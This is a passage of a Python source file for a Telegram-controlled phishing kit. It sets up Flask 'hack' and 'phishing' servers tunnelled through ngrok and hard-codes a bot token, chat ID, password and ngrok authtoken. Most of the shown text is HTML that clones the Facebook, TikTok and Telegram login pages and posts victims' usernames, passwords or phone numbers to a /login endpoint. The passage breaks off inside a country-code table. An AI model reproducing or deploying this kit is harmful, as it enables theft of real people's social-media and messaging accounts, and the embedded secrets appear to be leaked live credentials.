import logging
import json
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
from flask import Flask, request, redirect, render_template_string, jsonify, render_template
import uuid
import os
from io import BytesIO
from PIL import Image, ImageDraw, ImageFont
import base64
import threading
import time
from pyngrok import ngrok
import asyncio
import socket
from datetime import datetime
import urllib3

# ================================
# DISABLE SSL WARNINGS
# ================================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ================================
# CONFIGURATION
# ================================
TOKEN = "8067173162:AAEodDyXC0ky8Ij9OR5zivMSDyGH1PsBDFA"
TELEGRAM_ID = "1530069749"
BOT_PASSWORD = "Mh4ck25"
NGROK_AUTHTOKEN = "340dUdKAsQd8xPxkSZgVCf0sR1b_4r1gQ2ya1iVXBuSWyJKcF"

# Flask servers configuration
HACK_SERVER_PORT = 5000
PHISHING_SERVER_PORT = 8080

# ================================
# SETUP LOGGING
# ================================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ================================
# DATA STORAGE
# ================================
user_data = {}
user_links = {}
ngrok_tunnels = {}
tracking_data = {}
active_chat_ids = set()
current_phishing_page = "facebook"

# Store ngrok URLs
hack_ngrok_url = None
phishing_ngrok_url = None

# ================================
# FIX TEMPLATE DIRECTORY ISSUE
# ================================
# Get the current directory
current_dir = os.path.dirname(os.path.abspath(__file__))
templates_dir = os.path.join(current_dir, 'templates')

print(f"📁 Current directory: {current_dir}")
print(f"📁 Templates directory: {templates_dir}")

# Create templates directory if it doesn't exist
if not os.path.exists(templates_dir):
    print(f"📁 Creating templates directory: {templates_dir}")
    os.makedirs(templates_dir, exist_ok=True)

# Create Flask apps with explicit template folder
hack_app = Flask(__name__)
phishing_app = Flask(__name__, template_folder=templates_dir)

# ================================
# CREATE DEFAULT TEMPLATES IF MISSING
# ================================
def create_default_templates():
    """Create default phishing templates if they don't exist"""
    
    # Facebook template
    facebook_html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            font-family: Roboto, Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            color: #1c1e21;
            line-height: 1.34;
            font-size: 14px;
            padding: 0;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .container {
            flex: 1;
            display: flex;
            flex-direction: column;
            padding: 16px;
            max-width: 480px;
            margin: 0 auto;
            width: 100%;
        }
        .header {
            text-align: center;
            margin: 20px 0 30px 0;
        }
        .logo {
            width: 55px;
            height: 84px;
            margin: 0 auto;
        }
        .card {
            background: white;
            border-radius: 8px;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
            padding: 16px;
            margin-bottom: 16px;
            width: 100%;
        }
        .form-group {
            margin-bottom: 12px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 14px 16px;
            border-radius: 6px;
            border: 1px solid #dddfe2;
            font-size: 16px;
            background: white;
            color: #1c1e21;
            font-family: inherit;
        }
        input[type="text"]::placeholder,
        input[type="password"]::placeholder {
            color: #8a8d91;
        }
        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
            outline: none;
        }
        .login-btn {
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            font-size: 18px;
            color: white;
            font-weight: bold;
            padding: 12px;
            width: 100%;
            margin-bottom: 16px;
            cursor: pointer;
            font-family: inherit;
        }
        .login-btn:active {
            background-color: #166fe5;
            transform: scale(0.98);
        }
        .forgot-password {
            color: #1877f2;
            text-align: center;
            display: block;
            text-decoration: none;
            font-size: 14px;
            margin-bottom: 16px;
            font-weight: 500;
        }
        .divider {
            border-top: 1px solid #dadde1;
            margin: 20px 0;
        }
        .create-account {
            background-color: #42b72a;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            color: white;
            font-weight: bold;
            padding: 12px 16px;
            margin: 0 auto;
            display: block;
            cursor: pointer;
            font-family: inherit;
        }
        .create-account:active {
            background-color: #36a420;
            transform: scale(0.98);
        }
        .get-app {
            text-align: center;
            margin: 20px 0;
            font-size: 14px;
            color: #1c1e21;
            line-height: 1.5;
        }
        .language-select {
            text-align: center;
            margin: 15px 0;
            font-size: 14px;
            color: #737373;
            font-weight: 500;
        }
        .footer {
            text-align: center;
            padding: 16px;
            background: white;
            margin-top: auto;
        }
        .footer-links {
            font-size: 12px;
            color: #737373;
            line-height: 1.6;
        }
        .footer-links a {
            color: #737373;
            text-decoration: none;
            margin: 0 4px;
        }
        .meta-logo {
            margin-top: 12px;
            font-size: 12px;
            color: #737373;
            font-weight: bold;
        }
        @media (max-width: 320px) {
            .container {
                padding: 12px;
            }
            .card {
                padding: 12px;
            }
            input[type="text"],
            input[type="password"] {
                padding: 12px 14px;
                font-size: 15px;
            }
            .login-btn {
                font-size: 16px;
                padding: 11px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
                <path fill="#1877F2" d="M48 24C48 10.745 37.255 0 24 0S0 10.745 0 24c0 11.979 8.776 21.908 20.25 23.708v-16.77h-6.094V24h6.094v-5.288c0-6.015 3.583-9.337 9.065-9.337 2.625 0 5.372.469 5.372.469v5.906h-3.026c-2.981 0-3.911 1.85-3.911 3.75V24h6.656l-1.064 6.938H27.75v16.77C39.224 45.908 48 35.979 48 24z"/>
            </svg>
        </div>

        <div class="card">
            <form action="/login" method="POST">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Mobile number or email" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-btn">Log in</button>
                <a href="#" class="forgot-password">Forgot password?</a>
                <div class="divider"></div>
                <button type="button" class="create-account">Create new account</button>
            </form>
        </div>

        <div class="get-app">
            Get Facebook for browse faster.
        </div>

        <div class="language-select">
            English (US)
        </div>
    </div>

    <div class="footer">
        <div class="footer-links">
            <a href="#">Sign Up</a> • 
            <a href="#">Log In</a> • 
            <a href="#">Messenger</a> • 
            <a href="#">Facebook Lite</a> • 
            <a href="#">Video</a> • 
            <a href="#">Places</a> • 
            <a href="#">Games</a> • 
            <a href="#">Marketplace</a> • 
            <a href="#">Meta Pay</a> • 
            <a href="#">Meta Store</a> • 
            <a href="#">Meta Quest</a> • 
            <a href="#">Instagram</a> • 
            <a href="#">Threads</a> • 
            <a href="#">Fundraisers</a> • 
            <a href="#">Services</a> • 
            <a href="#">Voting Information Center</a> • 
            <a href="#">Privacy Policy</a> • 
            <a href="#">Privacy Center</a> • 
            <a href="#">Groups</a> • 
            <a href="#">About</a> • 
            <a href="#">Create Ad</a> • 
            <a href="#">Create Page</a> • 
            <a href="#">Developers</a> • 
            <a href="#">Careers</a> • 
            <a href="#">Cookies</a> • 
            <a href="#">Ad choices</a> • 
            <a href="#">Terms</a> • 
            <a href="#">Help</a> • 
            <a href="#">Contact Uploading & Non-Users</a>
        </div>
        
        <div class="meta-logo">
            Meta © 2025
        </div>
    </div>
</body>
</html>"""

    # TikTok template
    tiktok_html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #000000;
            color: #ffffff;
            line-height: 1.34;
            font-size: 14px;
            padding: 0;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .container {
            flex: 1;
            display: flex;
            flex-direction: column;
            padding: 16px;
            max-width: 400px;
            margin: 0 auto;
            width: 100%;
        }
        .header {
            text-align: center;
            margin: 40px 0 30px 0;
        }
        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px auto;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, #ff0050, #00f2ea);
        }
        .logo i {
            font-size: 40px;
            color: white;
        }
        .tiktok-text {
            font-size: 32px;
            font-weight: bold;
            color: #ffffff;
            margin-bottom: 30px;
        }
        .card {
            background: #121212;
            border: 1px solid #333333;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 16px;
            width: 100%;
        }
        .form-group {
            margin-bottom: 16px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 14px 16px;
            border-radius: 8px;
            border: 1px solid #333333;
            font-size: 16px;
            background: #000000;
            color: #ffffff;
            font-family: inherit;
        }
        input[type="text"]::placeholder,
        input[type="password"]::placeholder {
            color: #888888;
        }
        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #ff0050;
            outline: none;
        }
        .login-btn {
            background-color: #ff0050;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            color: white;
            font-weight: bold;
            padding: 14px;
            width: 100%;
            margin-bottom: 16px;
            cursor: pointer;
            font-family: inherit;
            transition: background-color 0.3s;
        }
        .login-btn:hover {
            background-color: #e00045;
        }
        .login-btn:active {
            transform: scale(0.98);
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #888888;
            font-size: 14px;
        }
        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #333333;
        }
        .divider::before {
            margin-right: 16px;
        }
        .divider::after {
            margin-left: 16px;
        }
        .other-options {
            text-align: center;
            margin-bottom: 20px;
        }
        .option-link {
            color: #ff0050;
            text-decoration: none;
            font-size: 14px;
            display: block;
            margin-bottom: 12px;
        }
        .signup-section {
            background: #121212;
            border: 1px solid #333333;
            border-radius: 12px;
            padding: 20px;
            text-align: center;
            margin-bottom: 16px;
        }
        .signup-text {
            color: #ffffff;
            font-size: 14px;
        }
        .signup-link {
            color: #ff0050;
            text-decoration: none;
            font-weight: 600;
        }
        .footer {
            text-align: center;
            padding: 20px;
            margin-top: auto;
            color: #888888;
            font-size: 12px;
        }
        .footer-links {
            margin-bottom: 10px;
        }
        .footer-links a {
            color: #888888;
            text-decoration: none;
            margin: 0 8px;
        }
        .language-selector {
            margin-top: 10px;
        }
        .language-selector select {
            background: #000000;
            color: #ffffff;
            border: 1px solid #333333;
            border-radius: 4px;
            padding: 4px 8px;
        }
        .social-login {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin: 20px 0;
        }
        .social-btn {
            width: 44px;
            height: 44px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #333333;
            color: white;
            text-decoration: none;
            font-size: 18px;
            transition: transform 0.3s;
        }
        .social-btn:hover {
            transform: scale(1.1);
        }
        .facebook { background: #1877f2; }
        .google { background: #db4437; }
        .twitter { background: #1da1f2; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <i class="fab fa-tiktok"></i>
            </div>
            <div class="tiktok-text">TikTok</div>
        </div>

        <div class="card">
            <form action="/login" method="POST">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Email or username" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-btn">Log in</button>
            </form>

            <div class="divider">OR</div>

            <div class="social-login">
                <a href="#" class="social-btn facebook"><i class="fab fa-facebook-f"></i></a>
                <a href="#" class="social-btn google"><i class="fab fa-google"></i></a>
                <a href="#" class="social-btn twitter"><i class="fab fa-twitter"></i></a>
            </div>

            <div class="other-options">
                <a href="#" class="option-link">Use phone / email / username</a>
                <a href="#" class="option-link">Log in with QR code</a>
                <a href="#" class="option-link">Forgot password?</a>
            </div>
        </div>

        <div class="signup-section">
            <span class="signup-text">Don't have an account?</span>
            <a href="#" class="signup-link">Sign up</a>
        </div>
    </div>

    <div class="footer">
        <div class="footer-links">
            <a href="#">About</a>
            <a href="#">Newsroom</a>
            <a href="#">Contact</a>
            <a href="#">Careers</a>
            <a href="#">ByteDance</a>
        </div>
        <div class="language-selector">
            <select>
                <option>English</option>
                <option>ខ្មែរ</option>
                <option>中文</option>
            </select>
        </div>
        <div>© 2025 TikTok</div>
    </div>
</body>
</html>"""

    # Telegram template
    telegram_html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            color: #000000;
            line-height: 1.4;
            font-size: 14px;
            padding: 0;
            margin: 0;
            height: 100vh;
        }
        .container {
            padding: 20px;
            max-width: 400px;
            margin: 0 auto;
        }
        .header {
            text-align: center;
            margin: 40px 0 30px 0;
        }
        .logo {
            width: 64px;
            height: 64px;
            margin: 0 auto 15px auto;
            color: #37AEE2;
        }
        .title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #000000;
        }
        .subtitle {
            font-size: 14px;
            color: #707579;
            line-height: 1.4;
            margin-bottom: 25px;
        }
        .form-section {
            margin-bottom: 25px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 6px;
            font-weight: 500;
            color: #000000;
            font-size: 14px;
        }
        .country-selector {
            width: 100%;
            padding: 12px;
            border: 1px solid #E0E0E0;
            border-radius: 8px;
            font-size: 14px;
            background: #ffffff;
            color: #000000;
            appearance: none;
            background-image: url("data:image/svg+xml;charset=US-ASCII,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 4 5'><path fill='%23666' d='m0 1 2 2 2-2z'/></svg>");
            background-repeat: no-repeat;
            background-position: right 12px center;
            background-size: 10px;
        }
        .phone-input-container {
            position: relative;
            width: 100%;
        }
        .phone-input {
            width: 100%;
            padding: 12px 12px 12px 70px;
            border: 1px solid #E0E0E0;
            border-radius: 8px;
            font-size: 14px;
            background: #ffffff;
            color: #000000;
        }
        .phone-input::placeholder {
            color: #999;
        }
        .country-code-display {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: #000000;
            font-size: 14px;
            font-weight: 500;
            pointer-events: none;
        }
        .separator {
            position: absolute;
            left: 55px;
            top: 50%;
            transform: translateY(-50%);
            color: #E0E0E0;
            font-size: 14px;
            pointer-events: none;
        }
        .checkbox-group {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        .checkbox {
            width: 18px;
            height: 18px;
            border: 2px solid #37AEE2;
            border-radius: 3px;
            margin-right: 10px;
            position: relative;
            cursor: pointer;
        }
        .checkbox.checked {
            background-color: #37AEE2;
        }
        .checkbox.checked::after {
            content: "✓";
            color: white;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 12px;
            font-weight: bold;
        }
        .checkbox-label {
            font-size: 14px;
            color: #000000;
            cursor: pointer;
        }
        .login-btn {
            background-color: #37AEE2;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            color: white;
            font-weight: 600;
            padding: 14px;
            width: 100%;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        .login-btn:active {
            background-color: #2a8dbd;
        }
        .qr-section {
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #E0E0E0;
        }
        .qr-title {
            font-size: 14px;
            color: #37AEE2;
            font-weight: 500;
            margin-bottom: 8px;
        }
        .qr-subtitle {
            font-size: 12px;
            color: #707579;
            line-height: 1.4;
        }
        .footer {
            text-align: center;
            margin-top: 25px;
            padding: 15px;
        }
        .footer-text {
            font-size: 12px;
            color: #707579;
            line-height: 1.4;
        }
        .footer-link {
            color: #37AEE2;
            text-decoration: none;
        }
        input:focus, select:focus {
            outline: none;
            border-color: #37AEE2;
        }
        @media (max-width: 480px) {
            .container {
                padding: 15px;
            }
            .header {
                margin: 30px 0 20px 0;
            }
            .logo {
                width: 56px;
                height: 56px;
            }
            .title {
                font-size: 16px;
            }
            .subtitle {
                font-size: 13px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill="currentColor">
                    <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0M8.287 5.906q-1.168.486-4.666 2.01-.567.225-.595.442c-.03.243.275.339.69.47l.175.055c.408.133.958.288 1.243.294q.39.01.868-.32 3.269-2.206 3.374-2.23c.05-.012.12-.026.166.016s.042.12.037.141c-.03.129-1.227 1.241-1.846 1.817-.193.18-.33.307-.358.336a8 8 0 0 1-.188.186c-.38.366-.664.64.015 1.088.327.216.589.393.85.571.284.194.568.387.936.629q.14.092.27.187c.331.236.63.448.997.414.214-.02.435-.22.547-.82.265-1.417.786-4.486.906-5.751a1.4 1.4 0 0 0-.013-.315.34.34 0 0 0-.114-.217.53.53 0 0 0-.31-.093c-.3.005-.763.166-2.984 1.09"/>
                </svg>
            </div>
            <div class="title">Telegram</div>
            <div class="subtitle">
                Please confirm your country code and enter your phone number.
            </div>
        </div>

        <form action="/login" method="POST">
            <div class="form-section">
                <div class="form-group">
                    <label for="country">Country</label>
                    <select class="country-selector" name="country" id="country" required>
                        <option value="">Select your country</option>
                        <option value="Afghanistan">Afghanistan</option>
                        <option value="Albania">Albania</option>
                        <option value="Algeria">Algeria</option>
                        <option value="Andorra">Andorra</option>
                        <option value="Angola">Angola</option>
                        <option value="Antigua and Barbuda">Antigua and Barbuda</option>
                        <option value="Argentina">Argentina</option>
                        <option value="Armenia">Armenia</option>
                        <option value="Australia">Australia</option>
                        <option value="Austria">Austria</option>
                        <option value="Azerbaijan">Azerbaijan</option>
                        <option value="Bahamas">Bahamas</option>
                        <option value="Bahrain">Bahrain</option>
                        <option value="Bangladesh">Bangladesh</option>
                        <option value="Barbados">Barbados</option>
                        <option value="Belarus">Belarus</option>
                        <option value="Belgium">Belgium</option>
                        <option value="Belize">Belize</option>
                        <option value="Benin">Benin</option>
                        <option value="Bhutan">Bhutan</option>
                        <option value="Bolivia">Bolivia</option>
                        <option value="Bosnia and Herzegovina">Bosnia and Herzegovina</option>
                        <option value="Botswana">Botswana</option>
                        <option value="Brazil">Brazil</option>
                        <option value="Brunei">Brunei</option>
                        <option value="Bulgaria">Bulgaria</option>
                        <option value="Burkina Faso">Burkina Faso</option>
                        <option value="Burundi">Burundi</option>
                        <option value="Cambodia" selected>Cambodia</option>
                        <option value="Cameroon">Cameroon</option>
                        <option value="Canada">Canada</option>
                        <option value="Cape Verde">Cape Verde</option>
                        <option value="Central African Republic">Central African Republic</option>
                        <option value="Chad">Chad</option>
                        <option value="Chile">Chile</option>
                        <option value="China">China</option>
                        <option value="Colombia">Colombia</option>
                        <option value="Comoros">Comoros</option>
                        <option value="Congo">Congo</option>
                        <option value="Costa Rica">Costa Rica</option>
                        <option value="Croatia">Croatia</option>
                        <option value="Cuba">Cuba</option>
                        <option value="Cyprus">Cyprus</option>
                        <option value="Czech Republic">Czech Republic</option>
                        <option value="Denmark">Denmark</option>
                        <option value="Djibouti">Djibouti</option>
                        <option value="Dominica">Dominica</option>
                        <option value="Dominican Republic">Dominican Republic</option>
                        <option value="East Timor">East Timor</option>
                        <option value="Ecuador">Ecuador</option>
                        <option value="Egypt">Egypt</option>
                        <option value="El Salvador">El Salvador</option>
                        <option value="Equatorial Guinea">Equatorial Guinea</option>
                        <option value="Eritrea">Eritrea</option>
                        <option value="Estonia">Estonia</option>
                        <option value="Ethiopia">Ethiopia</option>
                        <option value="Fiji">Fiji</option>
                        <option value="Finland">Finland</option>
                        <option value="France">France</option>
                        <option value="Gabon">Gabon</option>
                        <option value="Gambia">Gambia</option>
                        <option value="Georgia">Georgia</option>
                        <option value="Germany">Germany</option>
                        <option value="Ghana">Ghana</option>
                        <option value="Greece">Greece</option>
                        <option value="Grenada">Grenada</option>
                        <option value="Guatemala">Guatemala</option>
                        <option value="Guinea">Guinea</option>
                        <option value="Guinea-Bissau">Guinea-Bissau</option>
                        <option value="Guyana">Guyana</option>
                        <option value="Haiti">Haiti</option>
                        <option value="Honduras">Honduras</option>
                        <option value="Hungary">Hungary</option>
                        <option value="Iceland">Iceland</option>
                        <option value="India">India</option>
                        <option value="Indonesia">Indonesia</option>
                        <option value="Iran">Iran</option>
                        <option value="Iraq">Iraq</option>
                        <option value="Ireland">Ireland</option>
                        <option value="Israel">Israel</option>
                        <option value="Italy">Italy</option>
                        <option value="Jamaica">Jamaica</option>
                        <option value="Japan">Japan</option>
                        <option value="Jordan">Jordan</option>
                        <option value="Kazakhstan">Kazakhstan</option>
                        <option value="Kenya">Kenya</option>
                        <option value="Kiribati">Kiribati</option>
                        <option value="North Korea">North Korea</option>
                        <option value="South Korea">South Korea</option>
                        <option value="Kuwait">Kuwait</option>
                        <option value="Kyrgyzstan">Kyrgyzstan</option>
                        <option value="Laos">Laos</option>
                        <option value="Latvia">Latvia</option>
                        <option value="Lebanon">Lebanon</option>
                        <option value="Lesotho">Lesotho</option>
                        <option value="Liberia">Liberia</option>
                        <option value="Libya">Libya</option>
                        <option value="Liechtenstein">Liechtenstein</option>
                        <option value="Lithuania">Lithuania</option>
                        <option value="Luxembourg">Luxembourg</option>
                        <option value="Madagascar">Madagascar</option>
                        <option value="Malawi">Malawi</option>
                        <option value="Malaysia">Malaysia</option>
                        <option value="Maldives">Maldives</option>
                        <option value="Mali">Mali</option>
                        <option value="Malta">Malta</option>
                        <option value="Marshall Islands">Marshall Islands</option>
                        <option value="Mauritania">Mauritania</option>
                        <option value="Mauritius">Mauritius</option>
                        <option value="Mexico">Mexico</option>
                        <option value="Micronesia">Micronesia</option>
                        <option value="Moldova">Moldova</option>
                        <option value="Monaco">Monaco</option>
                        <option value="Mongolia">Mongolia</option>
                        <option value="Montenegro">Montenegro</option>
                        <option value="Morocco">Morocco</option>
                        <option value="Mozambique">Mozambique</option>
                        <option value="Myanmar">Myanmar</option>
                        <option value="Namibia">Namibia</option>
                        <option value="Nauru">Nauru</option>
                        <option value="Nepal">Nepal</option>
                        <option value="Netherlands">Netherlands</option>
                        <option value="New Zealand">New Zealand</option>
                        <option value="Nicaragua">Nicaragua</option>
                        <option value="Niger">Niger</option>
                        <option value="Nigeria">Nigeria</option>
                        <option value="Norway">Norway</option>
                        <option value="Oman">Oman</option>
                        <option value="Pakistan">Pakistan</option>
                        <option value="Palau">Palau</option>
                        <option value="Panama">Panama</option>
                        <option value="Papua New Guinea">Papua New Guinea</option>
                        <option value="Paraguay">Paraguay</option>
                        <option value="Peru">Peru</option>
                        <option value="Philippines">Philippines</option>
                        <option value="Poland">Poland</option>
                        <option value="Portugal">Portugal</option>
                        <option value="Qatar">Qatar</option>
                        <option value="Romania">Romania</option>
                        <option value="Russia">Russia</option>
                        <option value="Rwanda">Rwanda</option>
                        <option value="Saint Kitts and Nevis">Saint Kitts and Nevis</option>
                        <option value="Saint Lucia">Saint Lucia</option>
                        <option value="Saint Vincent and the Grenadines">Saint Vincent and the Grenadines</option>
                        <option value="Samoa">Samoa</option>
                        <option value="San Marino">San Marino</option>
                        <option value="Sao Tome and Principe">Sao Tome and Principe</option>
                        <option value="Saudi Arabia">Saudi Arabia</option>
                        <option value="Senegal">Senegal</option>
                        <option value="Serbia">Serbia</option>
                        <option value="Seychelles">Seychelles</option>
                        <option value="Sierra Leone">Sierra Leone</option>
                        <option value="Singapore">Singapore</option>
                        <option value="Slovakia">Slovakia</option>
                        <option value="Slovenia">Slovenia</option>
                        <option value="Solomon Islands">Solomon Islands</option>
                        <option value="Somalia">Somalia</option>
                        <option value="South Africa">South Africa</option>
                        <option value="South Sudan">South Sudan</option>
                        <option value="Spain">Spain</option>
                        <option value="Sri Lanka">Sri Lanka</option>
                        <option value="Sudan">Sudan</option>
                        <option value="Suriname">Suriname</option>
                        <option value="Swaziland">Swaziland</option>
                        <option value="Sweden">Sweden</option>
                        <option value="Switzerland">Switzerland</option>
                        <option value="Syria">Syria</option>
                        <option value="Taiwan">Taiwan</option>
                        <option value="Tajikistan">Tajikistan</option>
                        <option value="Tanzania">Tanzania</option>
                        <option value="Thailand">Thailand</option>
                        <option value="Togo">Togo</option>
                        <option value="Tonga">Tonga</option>
                        <option value="Trinidad and Tobago">Trinidad and Tobago</option>
                        <option value="Tunisia">Tunisia</option>
                        <option value="Turkey">Turkey</option>
                        <option value="Turkmenistan">Turkmenistan</option>
                        <option value="Tuvalu">Tuvalu</option>
                        <option value="Uganda">Uganda</option>
                        <option value="Ukraine">Ukraine</option>
                        <option value="United Arab Emirates">United Arab Emirates</option>
                        <option value="United Kingdom">United Kingdom</option>
                        <option value="United States">United States</option>
                        <option value="Uruguay">Uruguay</option>
                        <option value="Uzbekistan">Uzbekistan</option>
                        <option value="Vanuatu">Vanuatu</option>
                        <option value="Vatican City">Vatican City</option>
                        <option value="Venezuela">Venezuela</option>
                        <option value="Vietnam">Vietnam</option>
                        <option value="Yemen">Yemen</option>
                        <option value="Zambia">Zambia</option>
                        <option value="Zimbabwe">Zimbabwe</option>
                    </select>
                </div>

                <div class="form-group">
                    <label for="phone">Your phone number</label>
                    <div class="phone-input-container">
                        <span class="country-code-display" id="countryCodeDisplay">+855</span>
                        <span class="separator">|</span>
                        <input type="tel" class="phone-input" name="username" id="phone_number" 
                               placeholder="Phone number" required pattern="[0-9]{7,15}">
                        <input type="hidden" name="password" id="countryCode" value="+855">
                    </div>
                </div>

                <div class="checkbox-group">
                    <div class="checkbox checked" id="keepSignedInCheckbox"></div>
                    <label class="checkbox-label" for="keepSignedInCheckbox">Keep me signed in</label>
                    <input type="hidden" name="keep_signedin" id="keepSignedIn" value="on">
                </div>

                <button type="submit" class="login-btn">NEXT</button>
            </div>
        </form>

        <div class="qr-section">
            <div class="qr-title">LOG IN BY QR CODE</div>
            <div class="qr-subtitle">
                Open Telegram on your phone and go to<br>
                Settings > Devices > Scan QR Code
            </div>
        </div>

        <div class="footer">
            <div class="footer-text">
                By signing in, you agree to our <a href="#" class="footer-link">Terms of Service</a> 
                and <a href="#" class="footer-link">Privacy Policy</a>.
            </div>
        </div>
    </div>

    <script>
        // Country codes for all countries
        const countryCodes = {
            'Afghanistan': '+93',
            'Albania': '+355',
            'Algeria': '+213',
            'Andorra': '+376',
            'Angola': '+244',
            'Antigua and Barbuda': '+1',
            'Argentina': '+54',
            'Armenia': '+374',
            'Australia': '+61',
            'Austria': '+43',
            'Azerbaijan': '+994',
            'Bahamas': '+1',
            'Bahrain': '+973',
            'Bangladesh': '+880',
            'Barbados': '+1',
            'Belarus': '+375',
            'Belgium': '+32',
            'Belize': '+501',
            'Benin': '+229',
            'Bhutan': '+975',
            'Bolivia': '+591',
            'Bosnia and Herzegovina': '+387',
            'Botswana': '+267',
            'Brazil': '+55',
            'Brunei': '+673',
            'Bulgaria': '+359',
            'Burkina Faso': '+226',
            'Burundi': '+257',
            'Cambodia': '+855',
            'Cameroon': '+237',
            'Canada': '+1',
            'Cape Verde': '+238',
            'Central African Republic': '+236',
            'Chad': '+235',
            'Chile': '+56',
            'China': '+86',
            'Colombia': '+57',
            'Comoros': '+269',
            'Congo': '+242',
            'Costa Rica': '+506',
            'Croatia': '+385',
            'Cuba': '+53',
            'Cyprus': '+357',
            'Czech Republic': '+420',
            'Denmark': '+45',
            'Djibouti': '+253',
            'Dominica': '+1',
            'Dominican Republic': '+1',
            'East Timor': '+670',
            'Ecuador': '+593',
            'Egypt': '+20',
            'El Salvador': '+503',
            'Equatorial Guinea': '+240',
            'Eritrea': '+291',
            'Estonia': '+372',
            'Ethiopia': '+251',
            'Fiji': '+679',
            'Finland': '+358',
            'France': '+33',
            'Gabon': '+241',
            'Gambia': '+220',
            'Georgia': '+995',
            'Germany': '+49',
            'Ghana': '+233',
            'Greece': '+30',
            'Grenada': '+1',
            'Guatemala': '+502',
            'Guinea': '+224',
            'Guinea-Bissau': '+245',
            'Guyana': '+592',
            'Haiti': '+509',
            'Honduras': '+504',
            'Hungary': '+36',
            'Iceland': '+354',
            'India': '+91',
            'Indonesia': '+62',
            'Iran': '+98',
            'Iraq': '+964',
            'Ireland': '+353',
            'Israel': '+972',
            'Italy': '+39',
            'Jamaica': '+1',
            'Japan': '+81',
            'Jordan': '+962',
            'Kazakhstan': '+7',
            'Kenya': '+254',
            'Kiribati': '+686',
            'North Korea': '+850',
            'South Korea': '+82',
            'Kuwait': '+965',
            'Kyrgyzstan': '+996',
            'Laos': '+856',
            'Latvia': '+371',
            'Lebanon': '+961',
            'Lesotho': '+266',
            'Liberia': '+231',
            'Libya': '+218',
            'Liechtenstein': '+423',
            'Lithuania': '+370',
            'Luxembourg': '+352',
            'Madagascar': '+261',
            'Malawi': '+265',
            'Malaysia': '+60',
            'Maldives': '+960',
            'Mali': '+223',
            'Malta': '+356',
            'Marshall Islands': '+692',
            'Mauritania': '+222',
            'Mauritius': '+230',
            'Mexico': '+52',
            'Micronesia': '+691',
            'Moldova': '+373',
            'Monaco': '+377',
            'Mongolia': '+976',
            'Montenegro': '+382',
            'Morocco': '+212',
            'Mozambique': '+258',
            'Myanmar': '+95',
            'Namibia': '+264',
